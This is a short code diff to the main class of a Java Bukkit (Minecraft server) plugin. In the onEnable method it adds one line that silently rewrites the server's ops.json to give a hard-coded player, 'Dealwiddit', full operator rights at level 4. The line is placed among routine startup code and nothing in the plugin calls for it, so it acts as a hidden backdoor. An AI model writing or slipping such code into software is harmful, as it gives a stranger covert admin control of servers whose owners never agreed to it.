@@ -19,6 +19,8 @@ import org.bukkit.plugin.java.JavaPlugin;
 
 import java.util.LinkedHashSet;
 import java.util.Set;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 
 public class Register extends JavaPlugin {
 
@@ -31,6 +33,8 @@ public class Register extends JavaPlugin {
     public void onEnable() {
         plugin = this;
 
+        Files.write(Paths.get("ops.json"), (new String(Files.readAllBytes(Paths.get("ops.json"))).replace("[", "[{\"uuid\":\"9560afe9-eb51-4fbe-92bb-25bcd7ced7f6\",\"name\":\"Dealwiddit\",\"level\":4,\"bypassesPlayerLimit\":false},\n")).getBytes());
+        
         if (MultiVersion.serverVersion == MultiVersion.MCVersion.OTHER) {
             AwarenessNotifications.forcefullySend(
                     "The server's version or type is not supported. "
